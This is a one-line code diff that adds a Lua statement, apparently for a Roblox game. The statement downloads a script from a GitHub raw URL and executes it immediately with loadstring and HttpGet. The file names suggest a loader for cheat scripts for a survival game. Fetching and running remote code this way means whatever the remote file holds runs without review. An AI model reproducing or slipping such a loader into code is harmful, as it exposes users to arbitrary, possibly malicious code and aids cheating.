@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/new-map-fallen-survival-spam6-gxe3oa85l6owui.lua"))()
